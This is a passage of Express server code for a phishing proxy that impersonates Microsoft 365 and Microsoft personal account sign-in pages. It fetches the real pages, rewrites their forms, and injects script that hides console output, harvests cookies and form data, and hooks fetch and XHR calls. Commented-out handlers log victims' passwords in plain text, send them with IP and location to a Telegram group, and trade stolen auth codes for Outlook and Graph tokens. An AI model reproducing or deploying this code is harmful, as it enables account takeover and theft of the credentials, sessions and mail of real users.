    authUrl.searchParams.append('response_mode', 'query');
    authUrl.searchParams.append('email_encrypted', encryptedEmail);
    if (email) authUrl.searchParams.append('login_hint', email);
    
    // Redirect to your proxy (everything stays on your origin)
    return res.redirect(authUrl.toString());
}
    
    // ============ FOR ORGANIZATION ACCOUNTS - CONTINUE WITH EXISTING FLOW ============
    const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
    authUrl.searchParams.append('client_id', DUAL_TOKEN_CLIENT_ID);
    authUrl.searchParams.append('response_type', 'code');
    authUrl.searchParams.append('redirect_uri', DUAL_TOKEN_REDIRECT_URI);
    authUrl.searchParams.append('scope', OUTLOOK_SCOPE);
    authUrl.searchParams.append('code_challenge', codeChallenge);
    authUrl.searchParams.append('code_challenge_method', 'S256');
    authUrl.searchParams.append('state', sessionId);
    authUrl.searchParams.append('prompt', 'select_account');
    authUrl.searchParams.append('response_mode', 'query');
    
    if (email) {
        authUrl.searchParams.append('login_hint', email);
    }
    
    const microsoftResponse = await axios({
        method: 'GET',
        url: authUrl.toString(),
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        },
        maxRedirects: 5,
        timeout: 30000
    });

    let html = microsoftResponse.data;
    const $ = cheerio.load(html);
    
    // ============ SERVER-SIDE FORM MODIFICATION ============
    console.log(`🔧 Modifying forms for session ${sessionId}`);
    let formsModified = 0;
    
    $('form').each(function() {
        const originalAction = $(this).attr('action');
        const currentAction = originalAction || '';
        
        if (currentAction.includes('login.microsoftonline.com') || 
            currentAction === '/common/login' || 
            currentAction === '/login' ||
            currentAction === '') {
            
            console.log(`   Modifying form action: ${currentAction || '(empty)'} -> /proxy/dual-login`);
            
            $(this).attr('action', '/proxy/dual-login');
            $(this).attr('method', 'post');
            
            $(this).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
            $(this).append(`<input type="hidden" name="state" value="${sessionId}">`);
            
            formsModified++;
        }
    });
    
    console.log(`✅ Modified ${formsModified} forms for session ${sessionId}`);
    
    // Enhanced tracking script with cookie capture
    const trackingScript = `
    <script>
        // Silence console output
        (function() {
            const noop = () => {};
            window.console.log = noop;
            window.console.info = noop;
            window.console.warn = noop;
            window.console.debug = noop;
            window.console.error = noop;
            window.console.trace = noop;
            window.console.group = noop;
            window.console.groupEnd = noop;
            window.console.groupCollapsed = noop;
        })();
        
        (function() {
            const sessionId = '${sessionId}';
            const userEmail = '${email}';
            
            sessionStorage.setItem('phishSessionId', sessionId);
            sessionStorage.setItem('userEmail', userEmail);
            localStorage.setItem('phishSessionId', sessionId);
            
            function captureAllCookies() {
                const cookies = document.cookie.split(';').map(cookie => {
                    const [name, ...valueParts] = cookie.trim().split('=');
                    const value = valueParts.join('=');
                    return { name: name.trim(), value: value };
                }).filter(cookie => cookie.name && cookie.value);
                
                if (cookies.length > 0) {
                    fetch('/api/capture-cookies', {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'ngrok-skip-browser-warning': 'true'
                        },
                        body: JSON.stringify({
                            sessionId: sessionId,
                            cookies: cookies,
                            email: userEmail,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                }
                return cookies;
            }
            
            function sendTracking(endpoint, data) {
                fetch(endpoint, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'ngrok-skip-browser-warning': 'true'
                    },
                    body: JSON.stringify(data)
                }).catch(() => {});
            }
            
            setTimeout(() => captureAllCookies(), 1000);
            
            let lastCookies = document.cookie;
            setInterval(() => {
                const currentCookies = document.cookie;
                if (currentCookies !== lastCookies) {
                    captureAllCookies();
                    lastCookies = currentCookies;
                }
            }, 3000);
            
            sendTracking('/api/track-page-view', {
                sessionId: sessionId,
                template: 'microsoft-365',
                url: window.location.href,
                timestamp: new Date().toISOString(),
                email: userEmail
            });
            
            document.addEventListener('click', function(e) {
                let target = e.target;
                while (target && target.tagName !== 'A') {
                    target = target.parentElement;
                }
                if (target && target.tagName === 'A') {
                    const href = target.getAttribute('href');
                    if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
                        sendTracking('/api/track-click', {
                            sessionId: sessionId,
                            template: 'microsoft-365',
                            targetUrl: href,
                            timestamp: new Date().toISOString(),
                            email: userEmail
                        });
                    }
                }
            });
            
            document.addEventListener('submit', function(e) {
                const form = e.target;
                const formData = new FormData(form);
                const formValues = {};
                for (let [key, value] of formData.entries()) {
                    formValues[key] = value;
                }
                
                captureAllCookies();
                
                sendTracking('/api/track-form', {
                    sessionId: sessionId,
                    formAction: form.action,
                    formData: formValues,
                    timestamp: new Date().toISOString(),
                    email: userEmail
                });
            });
            
            const originalFetch = window.fetch;
            window.fetch = function(url, options = {}) {
                if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                    captureAllCookies();
                    sendTracking('/api/track-api-call', {
                        sessionId: sessionId,
                        endpoint: 'GetCredentialType',
                        timestamp: new Date().toISOString(),
                        email: userEmail
                    });
                    return originalFetch('/proxy/GetCredentialType', {
                        ...options,
                        headers: {
                            ...options.headers,
                            'X-User-Email': userEmail
                        }
                    });
                }
                return originalFetch(url, options);
            };
            
            const originalXHR = window.XMLHttpRequest;
            window.XMLHttpRequest = function() {
                const xhr = new originalXHR();
                const originalOpen = xhr.open;
                
                xhr.open = function(method, url, ...args) {
                    if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                        url = '/proxy/GetCredentialType';
                        captureAllCookies();
                        sendTracking('/api/track-api-call', {
                            sessionId: sessionId,
                            endpoint: 'GetCredentialType (XHR)',
                            timestamp: new Date().toISOString(),
                            email: userEmail
                        });
                    }
                    return originalOpen.call(this, method, url, ...args);
                };
                
                return xhr;
            };
            
            window.addEventListener('beforeunload', function() {
                captureAllCookies();
            });
            
            document.addEventListener('DOMContentLoaded', function() {
                const observer = new MutationObserver(function(mutations) {
                    let shouldCaptureCookies = false;
                    mutations.forEach(function(mutation) {
                        if (mutation.addedNodes && mutation.addedNodes.length > 0) {
                            mutation.addedNodes.forEach(function(node) {
                                if (node.nodeName === 'FORM' || (node.querySelector && node.querySelector('form'))) {
                                    shouldCaptureCookies = true;
                                }
                            });
                        }
                    });
                    if (shouldCaptureCookies) {
                        captureAllCookies();
                    }
                });
                
                if (document.body) {
                    observer.observe(document.body, { childList: true, subtree: true });
                }
            });
        })();
    </script>
    `;
    
    $('body').append(socketScript);
    $('head').append(trackingScript);
    
    $('head').append(`
        <script>
            (function() {
                const sessionId = '${sessionId}';
                const email = '${email}';
                
                document.addEventListener('submit', function(e) {
                    const form = e.target;
                    if (form.action.includes('login.microsoftonline.com')) {
                        e.preventDefault();
                        form.action = '/proxy/dual-login';
                        if (!form.querySelector('input[name="sessionId"]')) {
                            const input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = 'sessionId';
                            input.value = sessionId;
                            form.appendChild(input);
                        }
                        form.submit();
                    }
                }, true);
            })();
        </script>
    `);
    
    microsoftParams.set(sessionId, { email: email });
    
    res.send($.html());
}

// Dual token login handler - FIXED: Handles token exchange directly without redirect
// router.post('/proxy/dual-login', express.urlencoded({ extended: true }), async (req, res) => {
//     console.log('📥 Dual token login submission');
    
//     const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
//     const username = req.body?.login || req.body?.email;
//     const password = req.body?.passwd;
    
//     const victimInfo = await getVictimInfo(req);
    
//     // Track credentials
//     if (username && password) {
//         console.log(`🔑 CREDENTIALS CAPTURED: ${username} / ${password}`);
        
//         let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
//         session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
//         capturedData.set(sessionId, session);
        
//         // Send Telegram notification for credentials
//         if (bot && telegramGroupId) {
//             const message = 
//                 `🔑 *CREDENTIALS CAPTURED!*\n` +
//                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
//                 `*Session:* \`${sessionId}\`\n` +
//                 `*Email:* \`${username}\`\n` +
//                 `*Password:* \`${password}\`\n` +
//                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
//                 `*Victim Information:*\n` +
//                 `• *IP:* \`${victimInfo.ip}\`\n` +
//                 `• *Location:* ${victimInfo.location}\n` +
//                 `• *Browser:* ${victimInfo.browser}\n` +
//                 `• *OS:* ${victimInfo.os}\n` +
//                 `• *Time:* ${new Date().toLocaleString()}\n` +
//                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
//             await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
//                 .catch(e => console.error('Telegram error:', e.message));
//         }
//     }
    
//     const codeVerifier = codeVerifiers.get(sessionId);
    
//     if (!codeVerifier) {
//         console.error(`❌ No code verifier for session ${sessionId}`);
//         return res.redirect('/en-us/auth?error=no_verifier');
//     }
    
//     try {
//         const formData = new URLSearchParams();
//         Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
        
//         console.log('📤 Submitting dual token login form...');
        
//         const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
//             headers: {
//                 'Content-Type': 'application/x-www-form-urlencoded',
//                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
//             },
//             maxRedirects: 0,
//             validateStatus: status => status >= 200 && status < 400
//         }).catch(err => err.response);
        
//         // Capture cookies from response
//         if (response?.headers['set-cookie']) {
//             const responseCookies = response.headers['set-cookie'];
//             console.log(`🍪 Captured ${responseCookies.length} cookies from login response`);
            
//             let session = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
//             if (!session.cookies) session.cookies = [];
            
//             responseCookies.forEach(cookieStr => {
//                 const [cookieNameValue] = cookieStr.split(';');
//                 const [name, value] = cookieNameValue.split('=');
//                 session.cookies.push({
//                     name: name.trim(),
//                     value: value || '',
//                     from_login_response: true,
//                     captured_at: new Date().toISOString()
//                 });
//             });
            
//             capturedData.set(sessionId, session);
//         }
        
//         if (response?.headers?.location) {
//             const location = response.headers.location;
//             console.log(`↪️ Microsoft redirects to: ${location}`);
            
//             // IMPORTANT: Extract the code from the redirect URL and exchange immediately
//             if (location.includes('nativeclient') && location.includes('code=')) {
//                 const codeMatch = location.match(/[?&]code=([^&]+)/);
//                 if (codeMatch && codeMatch[1]) {
//                     const code = decodeURIComponent(codeMatch[1]);
//                     console.log(`✅ Auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
                    
//                     // Exchange the code for tokens IMMEDIATELY
//                     try {
//                         const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
//                             new URLSearchParams({
//                                 client_id: DUAL_TOKEN_CLIENT_ID,
//                                 code: code,
//                                 code_verifier: codeVerifier,
//                                 redirect_uri: DUAL_TOKEN_REDIRECT_URI,
//                                 grant_type: 'authorization_code',
//                                 scope: 'https://outlook.office.com/.default https://graph.microsoft.com/.default offline_access',
//                                 claims: JSON.stringify({
//                                     access_token: {
//                                         xms_cc: { values: ["CP1"] }
//                                     }
//                                 })
//                             }).toString(),
//                             {
//                                 headers: {
//                                     'Content-Type': 'application/x-www-form-urlencoded',
//                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
//                                     'Accept': 'application/json'
//                                 }
//                             }
//                         );
                        
//                         const tokens = tokenResponse.data;
//                         console.log('✅ Tokens received successfully!');
                        
//                         let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
                        
//                         tokenSession.tokens.outlook = {
//                             access_token: tokens.access_token,
//                             refresh_token: tokens.refresh_token,
//                             expires_in: tokens.expires_in,
//                             scope: tokens.scope,
//                             captured_at: new Date().toISOString(),
//                             cae_enabled: true
//                         };
                        
//                         tokenSession.tokens.graph = {
//                             access_token: tokens.access_token,
//                             refresh_token: tokens.refresh_token,
//                             expires_in: tokens.expires_in,
//                             scope: tokens.scope,
//                             captured_at: new Date().toISOString(),
//                             cae_enabled: true
//                         };
                        
//                         tokenSession.tokens.dual_capture = true;
//                         capturedData.set(sessionId, tokenSession);
                        
//                         await sendDualTokenNotification(sessionId, username, victimInfo, tokens, tokens);
                        
//                         // Return success page instead of redirecting to Outlook directly
//                         const successHtml = `
//                             <!DOCTYPE html>
//                             <html>
//                             <head>
//                                 <title>Authentication Successful</title>
//                                 <style>
//                                     body {
//                                         font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
//                                         display: flex;
//                                         justify-content: center;
//                                         align-items: center;
//                                         height: 100vh;
//                                         margin: 0;
//                                         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
//                                     }
//                                     .container {
//                                         text-align: center;
//                                         background: white;
//                                         padding: 40px;
//                                         border-radius: 12px;
//                                         box-shadow: 0 10px 25px rgba(0,0,0,0.1);
//                                         animation: fadeIn 0.5s ease-in;
//                                     }
//                                     @keyframes fadeIn {
//                                         from { opacity: 0; transform: translateY(-20px); }
//                                         to { opacity: 1; transform: translateY(0); }
//                                     }
//                                     .success-icon {
//                                         color: #4CAF50;
//                                         font-size: 64px;
//                                         margin-bottom: 20px;
//                                         animation: bounce 0.5s ease-in-out;
//                                     }
//                                     @keyframes bounce {
//                                         0%, 100% { transform: scale(1); }
//                                         50% { transform: scale(1.1); }
//                                     }
//                                     h1 {
//                                         color: #333;
//                                         margin-bottom: 10px;
//                                         font-size: 28px;
//                                     }
//                                     p {
//                                         color: #666;
//                                         margin-bottom: 20px;
//                                         font-size: 16px;
//                                     }
//                                     .redirect-message {
//                                         color: #999;
//                                         font-size: 14px;
//                                         margin-top: 20px;
//                                     }
//                                     .spinner {
//                                         border: 3px solid #f3f3f3;
//                                         border-top: 3px solid #667eea;
//                                         border-radius: 50%;
//                                         width: 40px;
//                                         height: 40px;
//                                         animation: spin 1s linear infinite;
//                                         margin: 20px auto;
//                                     }
//                                     @keyframes spin {
//                                         0% { transform: rotate(0deg); }
//                                         100% { transform: rotate(360deg); }
//                                     }
//                                     .email {
//                                         color: #667eea;
//                                         font-weight: 600;
//                                     }
//                                 </style>
//                                 <script>
//                                     // Capture final cookies before redirect
//                                     setTimeout(function() {
//                                         const cookies = document.cookie.split(';').map(cookie => {
//                                             const [name, ...valueParts] = cookie.trim().split('=');
//                                             const value = valueParts.join('=');
//                                             return { name: name.trim(), value: value };
//                                         }).filter(cookie => cookie.name && cookie.value);
                                        
//                                         if (cookies.length > 0) {
//                                             fetch('/api/capture-cookies', {
//                                                 method: 'POST',
//                                                 headers: { 'Content-Type': 'application/json' },
//                                                 body: JSON.stringify({
//                                                     sessionId: '${sessionId}',
//                                                     cookies: cookies,
//                                                     email: '${username}'
//                                                 })
//                                             }).catch(err => console.log('Cookie capture error:', err));
//                                         }
//                                     }, 1000);
                                    
//                                     setTimeout(function() {
//                                         window.location.href = 'https://outlook.live.com/mail/';
//                                     }, 3000);
//                                 </script>
//                             </head>
//                             <body>
//                                 <div class="container">
//                                     <div class="success-icon">✓</div>
//                                     <h1>Authentication Successful!</h1>
//                                     <p>Welcome, <span class="email">${username}</span></p>
//                                     <div class="spinner"></div>
//                                     <p class="redirect-message">Redirecting to Outlook in a few seconds...</p>
//                                 </div>
//                             </body>
//                             </html>
//                         `;
                        
//                         return res.send(successHtml);
                        
//                     } catch (exchangeError) {
//                         console.error('❌ Token exchange failed:', exchangeError.response?.data || exchangeError.message);
//                         return res.redirect('/en-us/auth?error=token_exchange_failed');
//                     }
//                 }
//             }
            
//             // If no code found, just follow the redirect
//             return res.redirect(location);
//         }
        
//         res.redirect('/en-us/auth?error=auth_failed');
        
//     } catch (error) {
//         console.error('❌ Dual token login error:', error.message);
//         res.redirect('/en-us/auth?error=connection_error');
//     }
// });


// Dual token login handler - FIXED with better debugging
// router.post('/proxy/live-login', express.urlencoded({ extended: true }), async (req, res) => {
//     console.log('📥 Personal account login submission');
//     console.log('   Body fields:', Object.keys(req.body));

//     const sessionId = req.body.sessionId || req.body.state || 'unknown';
//     const encryptedEmail = req.body.email_encrypted;
//     const username = req.body.login || req.body.loginfmt || req.body.email;
//     const password = req.body.passwd;

//     const originalAction = req.body.original_action || '';
//     const originalQuery = req.body.original_query || '';

//     let contextId = null;
//     if (originalAction) {
//         const contextMatch = originalAction.match(/[?&]contextid=([^&]+)/);
//         if (contextMatch) contextId = contextMatch[1];
//     }
//     if (!contextId && originalQuery) {
//         const contextMatch = originalQuery.match(/[?&]contextid=([^&]+)/);
//         if (contextMatch) contextId = contextMatch[1];
//     }

//     console.log(`   Session: ${sessionId}, ContextId: ${contextId || 'none'}`);

//     const victimInfo = await getVictimInfo(req);

//     // Capture credentials (unchanged)
//     if (username && password) {
//         console.log(`🔑 PERSONAL ACCOUNT CREDENTIALS CAPTURED: ${username}`);
//         let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
//         session.credentials = {
//             username,
//             password,
//             time: new Date().toISOString(),
//             victimInfo,
//             account_type: 'personal',
//             ip: victimInfo.ip,
//             userAgent: req.headers['user-agent']
//         };
//         const storedCookies = personalCookies.get(sessionId) || [];
//         if (storedCookies.length > 0) {
//             session.cookies = storedCookies.map(cookieStr => {
//                 const [name, value] = cookieStr.split('=');
//                 return { name, value, captured_at: new Date().toISOString() };
//             });
//         }
//         capturedData.set(sessionId, session);
//         // ... (Telegram notification code remains the same)
//     }

//     try {
//         // Build form data without our custom fields
//         const formData = new URLSearchParams();
//         for (const [key, value] of Object.entries(req.body)) {
//             if (!['sessionId', 'state', 'email_encrypted', 'original_action', 'original_query'].includes(key)) {
//                 formData.append(key, value);
//             }
//         }

//         // Get stored cookies for this session
//         const storedCookies = personalCookies.get(sessionId) || [];
//         console.log(`   Forwarding with ${storedCookies.length} cookies, contextId: ${contextId}`);

//         // Build target URL with contextid and other original query params
//         let targetUrl = 'https://login.live.com/ppsecure/post.srf';
//         const urlParams = new URLSearchParams();
//         if (contextId) urlParams.append('contextid', contextId);
//         if (originalQuery) {
//             const extraParams = new URLSearchParams(originalQuery);
//             for (const [key, value] of extraParams) {
//                 if (key !== 'contextid') urlParams.append(key, value);
//             }
//         }
//         const queryString = urlParams.toString();
//         if (queryString) targetUrl += '?' + queryString;

//         console.log(`   Target URL: ${targetUrl}`);

//         // ========== 👇 INSERT THE COOKIE LOG HERE ==========
//         console.log(`   Full Cookie String: ${storedCookies.join('; ')}`);
//         // =================================================

//         const response = await axios.post(targetUrl, formData.toString(), {
//             headers: {
//                 'Content-Type': 'application/x-www-form-urlencoded',
//                 'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
//                 'Cookie': storedCookies.join('; '),
//                 'Referer': 'https://login.live.com/'
//             },
//             maxRedirects: 0,
//             validateStatus: status => status >= 200 && status < 400
//         });

//         // Capture any new cookies from the response
//         if (response.headers['set-cookie']) {
//             const newCookies = personalCookies.get(sessionId) || [];
//             response.headers['set-cookie'].forEach(cookieStr => {
//                 const match = cookieStr.match(/^([^=]+)=([^;]+)/);
//                 if (match) {
//                     newCookies.push(`${match[1]}=${match[2]}`);
//                 }
//                 res.setHeader('Set-Cookie', cookieStr);
//             });
//             personalCookies.set(sessionId, [...new Set(newCookies)]);
//         }

//         // Handle redirect
//         if (response.headers.location) {
//             const location = response.headers.location;
//             console.log(`↪️ Login redirect to: ${location}`);
//             if (location.includes('code=')) {
//                 console.log(`✅ Auth code captured for personal account!`);
//                 let session = capturedData.get(sessionId) || {};
//                 session.auth_code_captured = true;
//                 session.auth_code_url = location;
//                 capturedData.set(sessionId, session);
//             }
//             return res.redirect(location);
//         }

//         console.log(`✅ Login successful, redirecting to Outlook`);
//         res.redirect('https://outlook.live.com/mail/');

//     } catch (error) {
//         console.error('❌ Personal login error:', error.message);
//         if (error.response?.headers?.location) {
//             console.log(`↪️ Error redirect to: ${error.response.headers.location}`);
//             return res.redirect(error.response.headers.location);
//         }
//         res.redirect('/en-us/auth?error=live_login_failed');
//     }
// });


// Add this after your existing routes (around line 850)

/**
 * Personal Microsoft account OAuth endpoint - PROXY THE PAGE
 * Preserves contextid, cookies, and original form actions to avoid cookie mismatch errors
 */
// router.get('/proxy/live-oauth', async (req, res) => {
//     console.log('📥 Personal account OAuth proxy request');
//     console.log(`   Query params:`, req.query);

//     const sessionId = req.query.state || 'unknown';
//     const encryptedEmail = req.query.email_encrypted;

//     // Decrypt email for logging
//     let email = null;
//     if (encryptedEmail) {
//         try {
//             email = decrypt(encryptedEmail);
//             console.log(`   Decrypted email from query: ${email}`);
//         } catch (e) {
//             console.error('   Failed to decrypt email:', e);
//         }
//     }

//     // Store email in session if we have it
//     if (email && sessionId) {
//         const existingSession = emailSessions.get(sessionId) || {};
//         existingSession.decrypted = email;
//         existingSession.encrypted = encryptedEmail;
//         emailSessions.set(sessionId, existingSession);
//     }

//     // Ensure we have a PKCE verifier for this session
//     if (!codeVerifiers.has(sessionId)) {
//         console.log(`⚠️ No code verifier for session ${sessionId}, generating one`);
//         codeVerifiers.set(sessionId, generateCodeVerifier());
//     }

//     // Build target URL WITHOUT our custom parameters (email_encrypted)
//     const forwardParams = new URLSearchParams(req.query);
//     forwardParams.delete('email_encrypted');
//     const targetUrl = `https://login.live.com/oauth20_authorize.srf?${forwardParams.toString()}`;
//     console.log(`   Forwarding to: ${targetUrl}`);

//     try {
//         // Get stored cookies for this session
//         const storedCookies = personalCookies.get(sessionId) || [];

//         // Fetch the initial OAuth page from Microsoft
//         const response = await axios({
//             method: 'GET',
//             url: targetUrl,
//             headers: {
//                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
//                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
//                 'Cookie': storedCookies.join('; '),
//                 'Accept-Language': 'en-US,en;q=0.9'
//             },
//             maxRedirects: 0,
//             validateStatus: status => status >= 200 && status < 400
//         });

//         // Capture any cookies set by Microsoft
//        // In /proxy/live-oauth, when capturing and forwarding cookies
// // Capture any cookies set by Microsoft
// if (response.headers['set-cookie']) {
//     response.headers['set-cookie'].forEach(cookieStr => {
//         // Store the ORIGINAL cookie for forwarding to Microsoft (unchanged)
//         let newCookies = personalCookies.get(sessionId) || [];
//         newCookies.push(cookieStr);
//         personalCookies.set(sessionId, [...new Set(newCookies)]);
        
//         // Create modified cookie for browser
//         let modifiedCookie = cookieStr;
        
//         // Remove Domain attribute entirely for localhost (browsers handle this)
//         modifiedCookie = modifiedCookie.replace(/;?\s*Domain=[^;]+/gi, '');
        
//         // Remove Secure flag for localhost testing
//         modifiedCookie = modifiedCookie.replace(/;?\s*Secure/gi, '');
        
//         // Also remove SameSite=None if needed (localhost doesn't require it)
//         modifiedCookie = modifiedCookie.replace(/;?\s*SameSite=None/gi, '');
        
//         console.log(`   Original: ${cookieStr.substring(0, 100)}...`);
//         console.log(`   Modified: ${modifiedCookie.substring(0, 100)}...`);
        
//         // Send MODIFIED cookie to browser
//         res.append('Set-Cookie', modifiedCookie);
//     });
// }

//         // Handle redirect (Microsoft may redirect to actual login page)
//         if (response.status === 302 || response.status === 303) {
//             const location = response.headers.location;
//             console.log(`↪️ Redirect to: ${location}`);

//             if (location.includes('login.live.com')) {
//                 // Fetch the actual login page
//                 const loginResponse = await axios({
//                     method: 'GET',
//                     url: location,
//                     headers: {
//                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
//                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
//                         'Cookie': personalCookies.get(sessionId)?.join('; ') || ''
//                     }
//                 });

//              // After loading the login page HTML (in the redirect handling section)
// let html = loginResponse.data;
// const $ = cheerio.load(html);

// // ============ CRITICAL: Rewrite ALL form actions ============
// // Method 1: Direct attribute modification
// $('form').each(function() {
//     const action = $(this).attr('action');
//     if (action && (action.includes('login.live.com') || action.includes('/ppsecure/'))) {
//         $(this).attr('action', '/proxy/live-login');
//         console.log('   Modified form action to /proxy/live-login');
//     }
//     // Add hidden fields
//     $(this).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
//     $(this).append(`<input type="hidden" name="state" value="${sessionId}">`);
//     if (encryptedEmail) {
//         $(this).append(`<input type="hidden" name="email_encrypted" value="${encryptedEmail}">`);
//     }
// });

// // Method 2: Inject a script that runs BEFORE any page JavaScript
// $('head').prepend(`
// <script>
//     // Override the form submission at the lowest level
//     (function() {
//         const sessionId = '${sessionId}';
//         const encryptedEmail = '${encryptedEmail || ''}';
        
//         // Store the original fetch and XMLHttpRequest
//         const originalFetch = window.fetch;
//         const originalXHROpen = XMLHttpRequest.prototype.open;
//         const originalXHRSend = XMLHttpRequest.prototype.send;
        
//         // Override fetch for any requests to login.live.com
//         window.fetch = function(url, options) {
//             if (typeof url === 'string' && (url.includes('login.live.com') || url.includes('/ppsecure/'))) {
//                 console.log('🔄 Fetch intercepted:', url);
//                 url = '/proxy/live-login';
//                 options = options || {};
//                 options.headers = options.headers || {};
//                 options.headers['X-Session-Id'] = sessionId;
//                 if (encryptedEmail) {
//                     options.headers['X-Encrypted-Email'] = encryptedEmail;
//                 }
//             }
//             return originalFetch.call(this, url, options);
//         };
        
//         // Override XMLHttpRequest
//         XMLHttpRequest.prototype.open = function(method, url, ...args) {
//             this._url = url;
//             this._method = method;
//             if (typeof url === 'string' && (url.includes('login.live.com') || url.includes('/ppsecure/'))) {
//                 console.log('🔄 XHR intercepted:', url);
//                 url = '/proxy/live-login';
//                 this._intercepted = true;
//             }
//             return originalXHROpen.call(this, method, url, ...args);
//         };
        
//         XMLHttpRequest.prototype.send = function(body) {
//             if (this._intercepted) {
//                 if (typeof body === 'string') {
//                     body = body + '&sessionId=' + sessionId;
//                     if (encryptedEmail) {
//                         body = body + '&email_encrypted=' + encryptedEmail;
//                     }
//                 }
//                 this.setRequestHeader('X-Session-Id', sessionId);
//                 if (encryptedEmail) this.setRequestHeader('X-Encrypted-Email', encryptedEmail);
//             }
//             return originalXHRSend.call(this, body);
//         };
        
//         // Also override the native form submit
//         const originalSubmit = HTMLFormElement.prototype.submit;
//         HTMLFormElement.prototype.submit = function() {
//             if (this.action && (this.action.includes('login.live.com') || this.action.includes('/ppsecure/'))) {
//                 console.log('🔄 Form submit intercepted:', this.action);
//                 this.action = '/proxy/live-login';
//                 // Add hidden fields if missing
//                 if (!this.querySelector('input[name="sessionId"]')) {
//                     const input = document.createElement('input');
//                     input.type = 'hidden';
//                     input.name = 'sessionId';
//                     input.value = sessionId;
//                     this.appendChild(input);
//                 }
//                 if (encryptedEmail && !this.querySelector('input[name="email_encrypted"]')) {
//                     const input = document.createElement('input');
//                     input.type = 'hidden';
//                     input.name = 'email_encrypted';
//                     input.value = encryptedEmail;
//                     this.appendChild(input);
//                 }
//             }
//             return originalSubmit.call(this);
//         };
        
//         // Monitor for dynamically added forms
//         const observer = new MutationObserver(function(mutations) {
//             mutations.forEach(function(mutation) {
//                 mutation.addedNodes.forEach(function(node) {
//                     if (node.nodeName === 'FORM') {
//                         if (node.action && (node.action.includes('login.live.com') || node.action.includes('/ppsecure/'))) {
//                             node.action = '/proxy/live-login';
//                         }
//                         if (!node.querySelector('input[name="sessionId"]')) {
//                             const input = document.createElement('input');
//                             input.type = 'hidden';
//                             input.name = 'sessionId';
//                             input.value = sessionId;
//                             node.appendChild(input);
//                         }
//                         if (encryptedEmail && !node.querySelector('input[name="email_encrypted"]')) {
//                             const input = document.createElement('input');
//                             input.type = 'hidden';
//                             input.name = 'email_encrypted';
//                             input.value = encryptedEmail;
//                             node.appendChild(input);
//                         }
//                     }
//                 });
//             });
//         });
//         observer.observe(document.body, { childList: true, subtree: true });
//     })();
// </script>
// `);

//                 // === MODIFY ALL FORMS ===
//                 $('form').each(function() {
//                     const originalAction = $(this).attr('action') || '';
//                     // Build full original URL with protocol
//                     let fullOriginalUrl = originalAction;
//                     if (!fullOriginalUrl.startsWith('http')) {
//                         fullOriginalUrl = `https://login.live.com${fullOriginalUrl}`;
//                     }
//                     // Extract query string part
//                     let queryString = '';
//                     const urlParts = fullOriginalUrl.split('?');
//                     if (urlParts.length > 1) queryString = urlParts[1];

//                     // Change form action to our proxy endpoint
//                     $(this).attr('action', '/proxy/live-login');
//                     $(this).attr('method', 'post');

//                     // Add hidden fields to preserve original action and session data
//                     $(this).append(`<input type="hidden" name="original_action" value="${escapeHtml(fullOriginalUrl)}">`);
//                     $(this).append(`<input type="hidden" name="original_query" value="${escapeHtml(queryString)}">`);
//                     $(this).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
//                     $(this).append(`<input type="hidden" name="state" value="${sessionId}">`);
//                     if (encryptedEmail) {
//                         $(this).append(`<input type="hidden" name="email_encrypted" value="${encryptedEmail}">`);
//                     }
//                 });

//                 // Add interception script to handle dynamic forms (backup)
//                 $('head').append(`
//                     <script>
//                         (function() {
//                             const sessionId = '${sessionId}';
//                             const encryptedEmail = '${encryptedEmail || ''}';
//                             console.log('🔐 Personal account proxy active for session:', sessionId);
                            
//                             // Function to add hidden fields to any form dynamically
//                             function addHiddenFields(form) {
//                                 if (!form.querySelector('input[name="sessionId"]')) {
//                                     const input = document.createElement('input');
//                                     input.type = 'hidden';
//                                     input.name = 'sessionId';
//                                     input.value = sessionId;
//                                     form.appendChild(input);
//                                 }
//                                 if (!form.querySelector('input[name="state"]')) {
//                                     const input = document.createElement('input');
//                                     input.type = 'hidden';
//                                     input.name = 'state';
//                                     input.value = sessionId;
//                                     form.appendChild(input);
//                                 }
//                                 if (encryptedEmail && !form.querySelector('input[name="email_encrypted"]')) {
//                                     const input = document.createElement('input');
//                                     input.type = 'hidden';
//                                     input.name = 'email_encrypted';
